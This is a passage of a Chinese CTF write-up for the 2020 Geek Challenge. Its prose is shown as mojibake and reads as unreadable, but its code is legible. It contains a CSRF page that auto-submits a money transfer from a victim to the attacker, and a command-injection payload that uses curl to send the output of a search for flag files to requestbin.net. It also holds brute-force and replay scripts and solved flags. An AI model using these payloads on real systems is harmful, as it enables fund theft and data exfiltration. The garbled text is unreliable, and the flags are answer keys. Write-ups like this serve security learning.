<p>è·¨ç«™è¯·æ±‚æ”»å‡»ï¼Œç®€å•åœ°è¯´ï¼Œæ˜¯æ”»å‡»è€…é€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µæ¬ºéª—ç”¨æˆ·çš„æµè§ˆå™¨å»è®¿é—®ä¸€ä¸ªè‡ªå·±æ›¾ç»è®¤è¯è¿‡çš„ç½‘ç«™å¹¶è¿è¡Œä¸€äº›æ“ä½œï¼ˆå¦‚å‘é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç”šè‡³è´¢äº§æ“ä½œå¦‚è½¬è´¦å’Œè´­ä¹°å•†å“ï¼‰ã€‚ç”±äºæµè§ˆå™¨æ›¾ç»è®¤è¯è¿‡ï¼Œæ‰€ä»¥è¢«è®¿é—®çš„ç½‘ç«™ä¼šè®¤ä¸ºæ˜¯çœŸæ­£çš„ç”¨æˆ·æ“ä½œè€Œå»è¿è¡Œã€‚è¿™åˆ©ç”¨äº†webä¸­ç”¨æˆ·èº«ä»½éªŒè¯çš„ä¸€ä¸ªæ¼æ´ï¼š<strong>ç®€å•çš„èº«ä»½éªŒè¯åªèƒ½ä¿è¯è¯·æ±‚å‘è‡ªæŸä¸ªç”¨æˆ·çš„æµè§ˆå™¨ï¼Œå´ä¸èƒ½ä¿è¯è¯·æ±‚æœ¬èº«æ˜¯ç”¨æˆ·è‡ªæ„¿å‘å‡ºçš„</strong>ã€‚</p>
</blockquote>
<p>æ€»ç»“ä¸€ä¸‹æˆ‘ä»¬çš„æ”»å‡»æ‰‹æ®µï¼Œæˆ‘ä»¬éœ€è¦æŒŸåˆ¶ä¸€ä¸ªæœ‰é’±çš„ç”¨æˆ·ï¼Œè®©ä»–æ‰“é’±åˆ°æˆ‘ä»¬çš„è´¦æˆ·ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±æœ‰é’±ä¹°flagäº†</p>
<p><strong>ç°åœ¨å°±æ˜¯å®ç°çš„æ­¥éª¤äº†ï¼š</strong></p>
<ol>
<li>æˆ‘ä»¬éœ€è¦å†™ä¸€ä¸ªè·¨ç«™è„šæœ¬ï¼Œæ¥ä¼ªé€ ä¸€ä»½è½¬è´¦è®°å½•</li>
<li>æˆ‘ä»¬éœ€è¦é€‰æ‹©ä¸€ä¸ªå—å®³è´¦æˆ·ï¼Œè®©ä»–æ¥è¿è¡Œæˆ‘ä»¬çš„è„šæœ¬</li>
</ol>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€çœ‹ä¸€ä¸ª<strong>æ­£å¸¸çš„è½¬è´¦æ•°æ®åŒ…</strong>é•¿ä»€ä¹ˆæ ·å­</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;transfer.php HTTP&#x2F;1.1</span><br><span class="line">Host: 173.82.206.142:8005</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------41269904543009196447964679449</span><br><span class="line">Content-Length: 402</span><br><span class="line">Origin: http:&#x2F;&#x2F;173.82.206.142:8005</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;173.82.206.142:8005&#x2F;transfer.php</span><br><span class="line">Cookie: PHPSESSID&#x3D;95912f409b60a14797aa6d00f05471c1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------41269904543009196447964679449</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;target&quot;</span><br><span class="line"></span><br><span class="line">q</span><br><span class="line">-----------------------------41269904543009196447964679449</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;money&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------41269904543009196447964679449</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;messages&quot;</span><br><span class="line"></span><br><span class="line">emmm</span><br><span class="line">-----------------------------41269904543009196447964679449--</span><br></pre></td></tr></table></figure>

<p>å¤´éƒ¨ä¿¡æ¯æ˜¯ä¸€ä¸ªæ­£å¸¸çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦è®°ä½<strong>URLåœ°å€</strong></p>
<p>ä¸‹é¢çš„æ–‡ä»¶ä¿¡æ¯å€’æ˜¯ä¹‹å‰æ²¡æœ‰è§åˆ°è¿‡ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„POSTæäº¤</p>
<blockquote>
<p>POST å‡ ç§è¯·æ±‚ä¸»è¦åŒ…æ‹¬ application/x-www-form-urlencodedã€ multipart/form-dataã€application/jsonã€text/xml å››ç§çš„æ–¹æ³•</p>
<p>1ã€application/x-www-form-urlencoded (é»˜è®¤å¸¸ç”¨)</p>
<p>â€‹    æœ€å¸¸è§çš„ POST æäº¤æ•°æ®çš„æ–¹å¼</p>
<p>2ã€multipart/form-data</p>
<p>â€‹    ä»¤ä¸€ä¸ªå¸¸è§çš„ POST æ•°æ®æäº¤çš„æ–¹å¼ã€‚<strong>æˆ‘ä»¬ä½¿ç”¨è¡¨å•ä¸Šä¼ æ–‡ä»¶æ—¶</strong>ï¼Œå¿…é¡»è®© è¡¨å•çš„ enctypedç­‰äº multipart/form-data</p>
<p>è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬è¿™æ¬¡çš„POSTæäº¤æ–¹å¼äº†</p>
<p>3ã€application/json</p>
<p>â€‹    è¿™ç§æ–¹æ¡ˆï¼Œå¯ä»¥æ–¹ä¾¿çš„<strong>æäº¤å¤æ‚çš„ç»“æ„åŒ–æ•°æ®</strong>ï¼Œè¿™ç§POSTæäº¤æ–¹å¼è¶Šæ¥è¶Šå¤šï¼Œç”¨æ¥å‘Šè¯‰æœåŠ¡ç«¯æ¶ˆæ¯ä¸»ä½“æ˜¯åºåˆ—åŒ–åçš„ JSON å­—ç¬¦ä¸²</p>
<p>4ã€text/xml</p>
<p>â€‹    ç°åœ¨åŸºæœ¬ä¸ç”¨</p>
</blockquote>
<p><strong>multipart/form-data</strong>ï¼šå°±æ˜¯æˆ‘ä»¬è¿™ä¸€æ¬¡ç”¨åˆ°çš„ä¸€ç§POSTæäº¤æ–¹å¼äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http://173.82.206.142:8005/transfer.php&quot;</span> method=post enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">	&lt;input type=&quot;text&quot; name=&quot;target&quot; class=&quot;form-control form-control-line&quot; value=&#x27;e&#x27;&gt;</span><br><span class="line">    <span class="comment">//ç¬¬ä¸€ä¸ªinputå°±æ˜¯æäº¤æˆ‘ä»¬çš„è½¬è´¦å¯¹è±¡ï¼Œè¿™é‡Œå°±æ˜¯æˆ‘ä»¬è‡ªå·±çš„è´¦æˆ·äº†</span></span><br><span class="line">	&lt;input type=&quot;text&quot; name=&quot;money&quot; class=&quot;form-control form-control-line&quot; value=&#x27;10000000000000000000&#x27;&gt;</span><br><span class="line">    <span class="comment">//ç¬¬ä¸€ä¸ªinputæ˜¯è½¬è´¦çš„é‡‘é¢</span></span><br><span class="line">	&lt;input type=&quot;submit&quot; class=&quot;btn btn-success&quot; value=&quot;è½¬è´¦&quot;&gt;</span><br><span class="line">    <span class="comment">//æäº¤æŒ‰é’®ï¼Œæˆ‘ä»¬è¦ä¿è¯æ•°æ®åŒ…çš„å®Œæ•´ï¼Œä¸‹é¢çš„ä¹Ÿæ˜¯</span></span><br><span class="line">	&lt;textarea rows=&quot;5&quot; name=&quot;messages&quot; class=&quot;form-control form-control-line&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.forms[<span class="number">0</span>].submit();&lt;/script&gt;	<span class="comment">//è¿™ä¸ªå°±æ˜¯å†™ä¸€ä¸ªjsè‡ªåŠ¨æäº¤ï¼Œå½“ç‚¹åˆ°è¿™ä¸ªphpé¡µé¢çš„æ—¶å€™ï¼Œè‡ªåŠ¨è¿›è¡Œæäº¤</span></span><br></pre></td></tr></table></figure>

<p>okï¼Œå·²ç»å®Œæˆäº†ä¸€åŠäº†ï¼Œç°åœ¨éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç”¨æˆ·ï¼Œè®©ä»–å»ç‚¹å‡»æˆ‘ä»¬çš„è¿™ä¸ªé¡µé¢</p>
<p>æˆ‘ä»¬çœ‹åˆ°æŠ¥å‘Šé¡µé¢ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªç”¨æˆ·åé¦ˆé¡µé¢ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°å…¶ä¸­ä¸€æ¡</p>
<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-flagshop.png" alt="2020æå®¢å¤§æŒ‘æˆ˜-flagshop"></p>
<p>æˆ‘ä»¬å¯ä»¥æäº¤ä¸€ä¸ªæŠ¥å‘Šï¼Œè¿™ä¸ªLonglongä¼šå»ç‚¹å‡»æŠ¥å‘Šé‡Œçš„é“¾æ¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŒŸåˆ¶ä»–ç»™æˆ‘ä»¬æ‰“é’±äº†</p>
<p>ä½†æˆ‘ä»¬åœ¨æäº¤æŠ¥å‘Šæ—¶é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªéªŒè¯ç å¡«ä»€ä¹ˆ</p>
<blockquote>
<p>md5($code)[0:5] == d93b5</p>
</blockquote>
<p>å†™ä¸€ä¸ªè„šæœ¬å§ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5value</span>(<span class="params">s</span>):</span>  <span class="comment"># md5åŠ å¯†å‡½æ•°</span></span><br><span class="line">    md5 = hashlib.md5()  <span class="comment"># è·å–ä¸€ä¸ªmd5åŠ å¯†ç®—æ³•å¯¹è±¡</span></span><br><span class="line">    md5.update(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># æŒ‡å®šéœ€è¦åŠ å¯†çš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()  <span class="comment"># è·å–åŠ å¯†åçš„16è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5value(<span class="built_in">str</span>(i))[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">&quot;d93b5&quot;</span>:	<span class="comment">#å¡«å…¥å€¼</span></span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>okï¼Œæˆ‘ä»¬åªéœ€è¦å°†PHPæ–‡ä»¶éƒ¨ç½²å†è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œå†æŠ¥å‘Šæäº¤é“¾æ¥å°±å¯ä»¥äº†ï¼ŒæˆåŠŸä¹°åˆ°flag</p>
<h3 id="çŸ¥Xå ‚çš„phpæ•™ç¨‹"><a href="#çŸ¥Xå ‚çš„phpæ•™ç¨‹" class="headerlink" title="çŸ¥Xå ‚çš„phpæ•™ç¨‹"></a>çŸ¥Xå ‚çš„phpæ•™ç¨‹</h3><h4 id="è€ƒç‚¹ï¼šä»£ç æ‰§è¡Œ"><a href="#è€ƒç‚¹ï¼šä»£ç æ‰§è¡Œ" class="headerlink" title="è€ƒç‚¹ï¼šä»£ç æ‰§è¡Œ"></a>è€ƒç‚¹ï¼šä»£ç æ‰§è¡Œ</h4><p>æç¤ºï¼š</p>
<blockquote>
<p>çŸ¥Xå ‚ï¼ˆPS:è¯·å‹¿å¯¹å·å…¥åº§ï¼‰çš„phpæ•™ç¨‹å¼€è¯¾å•¦ï¼ã‚“ï¼Ÿå¥½åƒä¸å¤ªå¯¹åŠ²ï¼Ÿ</p>
<p>æ³¨æ„æŸ¥çœ‹å½“å‰ç›®å½•å’Œæ–‡ä»¶å</p>
</blockquote>
<p>è¿›å…¥åï¼Œç‚¹å‡»æ•™æ¡ˆè¿›å…¥ä¸€ä¸ªç›®å½•ï¼Œè¿™é‡Œçš„æ–‡ä»¶åä¸ºï¼š<strong>listdir.php</strong></p>
<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E7%9F%A5x%E5%A0%821.png" alt="2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚"></p>
<p>è¿›å…¥flag.phpï¼Œå‘ç°urlæ˜¯<strong>phpfile=**ï¼Œè€Œä¸”åé¢ç›´æ¥å¸¦äº†ä¸€ä¸ªæ–‡ä»¶å°±èƒ½æ‰“å¼€æŸ¥çœ‹å†…å®¹äº†ï¼Œè€Œä¸”é¡µé¢æç¤ºçœ‹ç›®å½•æ–‡ä»¶ï¼Œäºæ˜¯æ›´æ”¹ä¸º</strong>listdir.php**å°±å¯ä»¥çœ‹åˆ°å†…å®¹äº†</p>
<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E7%9F%A5x%E5%A0%822.png" alt="2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚"></p>
<p>æ–‡ä»¶æ‰“å¼€åå¯ä»¥çœ‹åˆ°ç›®å½•é¡µé¢ä¸‹çš„æºä»£ç äº†</p>
<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E7%9F%A5x%E5%A0%823.png" alt="2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚"></p>
<p><strong>æ³¨æ„ï¼š</strong> </p>
<p>è¿™ä¸ªç›®å½•ç•Œé¢æœ‰ä¸ª$_GET[â€˜dirnameâ€™]å‚æ•°è¢«ä¼ è¿›å»ï¼Œè€Œä¸”ç›´æ¥æ”¾åˆ°äº†exec()ä¸­ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“exec()å…è®¸æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº</p>
<p>åŒæ—¶ï¼Œè¿™é‡Œè¿˜å¼•ç”¨äº†ä¸€ä¸ªwaf.phpï¼Œé‚£æˆ‘ä»¬å†çœ‹ä¸€ä¸‹è¿™ä¸ªwaf</p>
<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E7%9F%A5x%E5%A0%824.png" alt="2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚"></p>
<p>è¿™ä¸ªwafé‡Œé¢è®¾ç½®äº†è¿‡æ»¤</p>
<p><strong>æ€»ç»“ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨dirnameå‚æ•°æ¥è¿›è¡Œä»£ç æ‰§è¡Œï¼Œéœ€è¦ç»•è¿‡ä¸€äº›ä¸œè¥¿</strong></p>
<p>æˆ‘ä»¬å¯ä»¥å°è¯•æ³¨å…¥ä»£ç ï¼Œå¯æ˜¯æ²¡æœ‰å›æ˜¾</p>
<p>è¿™é‡Œæ¨èä½¿ç”¨ä¸€ä¸ªåœ¨çº¿ç½‘ç«™ï¼Œ<a target="_blank" rel="noopener" href="http://requestbin.net/">å¯¹URLåˆ†ææ”¶é›†å¯¹å…¶å‘å‡ºçš„è¯·æ±‚</a></p>
<p>åŸç†æ˜¯è®©é¶æœºè®¿é—®è¿™ä¸ªurlï¼Œè¿™ä¸ªç½‘ç«™ä¼šå¯¹é¶æœºçš„è¯·æ±‚åŒ…åšä¸€ä¸ªåˆ†æï¼ŒåŒæ—¶è¿”å›ç»™æˆ‘ä»¬ä¸€ä¸ªæ•°æ®</p>
<p>è¿™å°±æ˜¯æˆ‘ä»¬æœ€åçš„payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;listdir.php?dirname&#x3D;; curl http:&#x2F;&#x2F;requestbin.net&#x2F;r&#x2F;wo949nwo?inspect&#x3D;&#96;find &#x2F; -name &#39;flag&#39;&#96;</span><br></pre></td></tr></table></figure>

<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E7%9F%A5x%E5%A0%825.png" alt="2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚"></p>
<p>æ‰¾åˆ°äº†è·¯å¾„ï¼Œç›´æ¥æ‹¿å»æ‰“å¼€å°±å¥½äº†</p>
<p><img src="https://antlers.oss-cn-hangzhou.aliyuncs.com/blog_images/CTF/2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-%E7%9F%A5x%E5%A0%826.png" alt="2020æå®¢å¤§æŒ‘æˆ˜-çŸ¥xå ‚"></p>
<h3 id="å¿æ‚”çš„åˆ˜å£®"><a href="#å¿æ‚”çš„åˆ˜å£®" class="headerlink" title="å¿æ‚”çš„åˆ˜å£®"></a>å¿æ‚”çš„åˆ˜å£®</h3><h4 id="è€ƒç‚¹ï¼špythonè„šæœ¬ç¼–å†™"><a href="#è€ƒç‚¹ï¼špythonè„šæœ¬ç¼–å†™" class="headerlink" title="è€ƒç‚¹ï¼špythonè„šæœ¬ç¼–å†™"></a>è€ƒç‚¹ï¼špythonè„šæœ¬ç¼–å†™</h4><p>æç¤ºï¼š</p>
<blockquote>
<p>åˆ˜å£®å¤©å¤©å¹²åäº‹ï¼Œè¿™æ¬¡ç»ˆäºè®©æˆ‘é€®åˆ°ä»–åœ¨pythonæ•™å ‚å¿æ‚”äº†</p>
</blockquote>
<p>è®©æˆ‘ä»¬å›ç­”ä¸€ä¸ªéšæœºç­”æ¡ˆï¼Œæ¯å¿æ‚”ä¸€æ¬¡æˆåŠŸå°±è®°å½•ä¸€æ¬¡ï¼Œéœ€è¦æˆ‘ä»¬ä¸€ç›´å¿æ‚”20æ¬¡ï¼Œä½†ç»™æˆ‘ä»¬çš„æ—¶é—´åªæœ‰3ç§’ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½å†™è„šæœ¬æ¥å¿æ‚”ï¼Œéœ€è¦å¸¦ä¸Šä¸Šä¸€æ¬¡çš„cookie</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_func</span>(<span class="params">req</span>):</span></span><br><span class="line">    cookie_new = requests.utils.dict_from_cookiejar(req.cookies)</span><br><span class="line">    req = request.post(<span class="string">&quot;http://120.79.197.4:5000/check&quot;</span>,data=cookie_new)</span><br><span class="line">    result = req.text</span><br><span class="line">    print(result)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line">request=requests.session()</span><br><span class="line">url = <span class="string">&quot;http://120.79.197.4:5000/&quot;</span></span><br><span class="line">req = request.get(url)</span><br><span class="line">cookie = requests.utils.dict_from_cookiejar(req.cookies)</span><br><span class="line">req2 = request.post(<span class="string">&quot;http://120.79.197.4:5000/check&quot;</span>,data=cookie)</span><br><span class="line">result = req2.text</span><br><span class="line">print(result)</span><br><span class="line">need_req = request_func(req2)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">20</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    need_req = request_func(req)</span><br></pre></td></tr></table></figure>



<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="No-RE-no-gain"><a href="#No-RE-no-gain" class="headerlink" title="No RE no gain"></a>No RE no gain</h3><h4 id="è€ƒç‚¹ï¼šIDAçš„ä½¿ç”¨"><a href="#è€ƒç‚¹ï¼šIDAçš„ä½¿ç”¨" class="headerlink" title="è€ƒç‚¹ï¼šIDAçš„ä½¿ç”¨"></a>è€ƒç‚¹ï¼šIDAçš„ä½¿ç”¨</h4><p>æ¯”è¾ƒç®€å•çš„reé¢˜ç›®ï¼Œé‡Œé¢æœ‰å¥½å¤šflagï¼Œä½†éƒ½ä¸å¯¹ï¼Œåªæœ‰ä¸‹é¢å•ç‹¬çš„æ˜¯</p>
<blockquote>
<p>SYC{S4y_He11o_th3_RE_World!!!}</p>
</blockquote>
<h3 id="æˆ‘çœŸä¸ä¼šå†™é©±åŠ¨ï¼"><a href="#æˆ‘çœŸä¸ä¼šå†™é©±åŠ¨ï¼" class="headerlink" title="æˆ‘çœŸä¸ä¼šå†™é©±åŠ¨ï¼"></a>æˆ‘çœŸä¸ä¼šå†™é©±åŠ¨ï¼</h3><h4 id="è€ƒç‚¹ï¼šIDAçš„ä½¿ç”¨-1"><a href="#è€ƒç‚¹ï¼šIDAçš„ä½¿ç”¨-1" class="headerlink" title="è€ƒç‚¹ï¼šIDAçš„ä½¿ç”¨"></a>è€ƒç‚¹ï¼šIDAçš„ä½¿ç”¨</h4><p>æ¯”ä¸Šé¢ä¸€é¢˜è¿˜ç®€å•ï¼Œç›´æ¥æŸ¥æ‰¾å­—ç¬¦ä¸²å°±å‡ºæ¥äº†</p>
<blockquote>
<p>SYC{First_Win64_DRIVER}</p>
</blockquote>
<h3 id="WhatsApk"><a href="#WhatsApk" class="headerlink" title="WhatsApk"></a>WhatsApk</h3><h4 id="è€ƒç‚¹ï¼šå®‰å“é€†å‘å·¥å…·"><a href="#è€ƒç‚¹ï¼šå®‰å“é€†å‘å·¥å…·" class="headerlink" title="è€ƒç‚¹ï¼šå®‰å“é€†å‘å·¥å…·"></a>è€ƒç‚¹ï¼šå®‰å“é€†å‘å·¥å…·</h4><p>æˆ‘ä»¬è¦ç”¨åˆ°å®‰å“é€†å‘çš„å·¥å…·ï¼Œæœç´¢flagå°±å‡ºæ¥äº†</p>
<h3 id="re00"><a href="#re00" class="headerlink" title="re00"></a>re00</h3><h4 id="è€ƒç‚¹ï¼šå¼‚æˆ–åŠ å¯†"><a href="#è€ƒç‚¹ï¼šå¼‚æˆ–åŠ å¯†" class="headerlink" title="è€ƒç‚¹ï¼šå¼‚æˆ–åŠ å¯†"></a>è€ƒç‚¹ï¼šå¼‚æˆ–åŠ å¯†</h4><p>ç”¨IDAæ‰“å¼€ï¼Œè¿›å…¥ä¸»å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(buf) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">char</span>)(buf[i] ^ <span class="number">0x44</span>) != byte_4060[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;wow, almost!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;yes! you get it!&quot;</span>);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  v1 = v4 &lt; *MK_FP(__FS__, <span class="number">40LL</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çœ‹åˆ°ï¼Œbuf[i] ^ 0x44 è¿›è¡Œå¼‚æˆ–ï¼Œæˆ‘ä»¬ç°åœ¨æ‰¾åˆ°**byte_4060[i]**å°±å¯ä»¥å†™ä¸ªpythonè¿›è¡Œå¼‚æˆ–äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="number">0x17</span>, <span class="number">0x1D</span>, <span class="number">0x07</span>, <span class="number">0x3F</span>, <span class="number">0x37</span>, <span class="number">0x2D</span>, <span class="number">0x29</span>, <span class="number">0x34</span>, <span class="number">0x28</span>, <span class="number">0x21</span>, <span class="number">0x1B</span>, <span class="number">0x37</span>, <span class="number">0x2D</span>, <span class="number">0x29</span>, <span class="number">0x34</span>, <span class="number">0x28</span>, <span class="number">0x21</span>, <span class="number">0x1B</span>, <span class="number">0x3C</span>, <span class="number">0x2B</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, <span class="number">0x36</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>, <span class="number">0x2D</span>, <span class="number">0x23</span>, <span class="number">0x2C</span>, <span class="number">0x30</span>, <span class="number">0x7B</span>, <span class="number">0x7B</span>, <span class="number">0x39</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">str</span>[i] ^ <span class="number">0x44</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>SYC{simple_simple_xorrr_right??}</p>
</blockquote>
<h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><h4 id="è€ƒç‚¹ï¼šè¿·å®«é¢˜"><a href="#è€ƒç‚¹ï¼šè¿·å®«é¢˜" class="headerlink" title="è€ƒç‚¹ï¼šè¿·å®«é¢˜"></a>è€ƒç‚¹ï¼šè¿·å®«é¢˜</h4><p>ç”¨IDAæ‰“å¼€ï¼Œæƒ¯ä¾‹æ‰¾æ‰¾å­—ç¬¦ä¸²ï¼Œåœ¨é‡Œé¢å‘ç°äº†ä¸€ä¸²å¾ˆå¥‡shjæ€ªçš„â€”â€“å’Œoooooï¼Œè¿›å…¥åå°±æ˜¯æˆ‘ä»¬è¦çš„ä¸»å‡½æ•°</p>
<p>é€šè¿‡shâ€™j</p>
